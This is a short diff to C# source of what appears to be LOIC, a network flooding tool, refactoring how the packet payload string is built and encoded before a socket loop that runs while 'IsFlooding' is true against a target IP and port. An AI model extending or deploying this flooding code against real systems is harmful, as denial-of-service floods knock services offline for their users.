@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Text;
 using System.Net.Sockets;
 using System.ComponentModel;
 
@@ -37,16 +38,17 @@ namespace LOIC
 		{
 			try
 			{
-				byte[] buf;
+			    string bufferContents;
 				if (random)
 				{
-					buf = System.Text.Encoding.ASCII.GetBytes(String.Format(Data, Functions.RandomString()));
+					bufferContents = String.Format(Data, Functions.RandomString());
 				}
 				else
 				{
-					buf = System.Text.Encoding.ASCII.GetBytes(Data);
+                    bufferContents = Data;
 				}
 
+                byte[] buf = Encoding.ASCII.GetBytes(bufferContents);
 				var RHost = new System.Net.IPEndPoint(System.Net.IPAddress.Parse(IP), Port);
 				while (IsFlooding)
 				{
